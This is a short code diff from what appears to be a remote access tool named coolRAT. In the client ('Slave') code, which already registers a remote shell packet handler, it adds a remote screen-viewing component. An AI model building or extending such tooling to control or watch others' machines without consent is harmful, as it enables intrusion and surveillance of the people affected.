@@ -25,6 +25,8 @@ namespace coolRAT.Slave
             Globals.LocalClient.RegisterPacketHandler("ConnectShellPacket", Shell_PacketReceivedHandler);
             Globals.LocalClient.ClientPingService.Start(PingServiceType.Active);
             Globals.LocalClient.ClientPingService.ConnectionLost += ClientPingService_ConnectionLost;
+
+            Globals.ScreenInstance = new RemoteScreen(Globals.LocalClient);
             Application.Run();
             return;
         }
